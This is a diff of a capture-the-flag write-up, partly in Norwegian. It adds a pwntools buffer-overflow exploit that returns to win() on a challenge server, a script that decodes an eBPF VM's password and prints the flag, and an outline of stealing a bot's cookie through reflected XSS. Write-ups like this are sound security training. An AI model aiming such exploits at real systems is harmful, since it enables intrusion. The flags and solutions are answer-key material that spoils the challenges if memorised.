@@ -154,7 +154,7 @@ print("Recovered password / flag:", original_password)
 
 # FORENSICS
 
-# Persistance is key
+## Persistance is key
 
 ```
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
@@ -221,6 +221,35 @@ Den åpner zippen og gir oss `flag.txt`:
 
 
 
+# PWN
+
+## Fear of Long Words
+
+Simple buffer overflow. Return to win().
+
+```py
+from pwn import *
+
+
+def main() -> None:
+    context.binary = ELF("./ordbog", checksec=False)
+    offset = 80
+    payload = b"A" * offset + p32(context.binary.symbols["win"])
+
+    io = process("./ordbog")
+    # nc fear-of-long-words.cfire 1337
+    io = remote("fear-of-long-words.cfire", 1337)
+    io.sendlineafter(b"> ", b"add " + str(len(payload)).encode())
+    io.sendafter(b"Enter word:\n", payload)
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+
+
 # REV
 
 # Mitosis
@@ -264,10 +293,41 @@ Flagget er:
 
 
 
+## Reactor
+
+### Summary
+
+The binary runs a custom VM inside the kernel via eBPF, hooked onto `clock_nanosleep` ticks. The VM reads a password over MMIO, encodes each character with a rolling XOR, and compares against expected values embedded in `.rodata`.
+
+Encoding: `((char + 0x30) & 0xFF) ^ ((index×8 − 0x30) & 0xFF)`
+
+### Solve
+
+The 23 expected values are at file offset `0x199EC0 + 253×2`. Invert the transform:
+
+```python
+import struct
+
+# Get the password data from the binary
+data = open('./reactor','rb').read()[0x199ec0 : 0x199ec0 + 308*2]
+w = struct.unpack_from('<308H', data)
+
+# Decrypt the password
+# ROM[0xfc] = w[252] = num chars; encoded values at w[253..275]
+print(''.join(
+    chr((( w[253+i] ^ (((i*8)-0x30)&0xFF) ) - 0x30) & 0xFF)
+    for i in range(w[252])
+))
+```
+
+`DDC{iT_runz_1n_da_c0r3}`
+
+
+
 
 # WEB
 
-# Analyse
+## Report Error
 
 Det er åpenbart at målet med oppgaven er å få botten som har flagget i en cookie til å sende oss flagget gjennom reflected XSS.
 
@@ -286,7 +346,7 @@ if (from != 'reportError' && to != 'eval'){
 ```
 
 
-# Løsning
+### Løsning
 
 Jeg forstår at målet er å gjøre noe likende, så jeg ønsker å finne mulige variasjoner av `reportError` og `eval`:
 
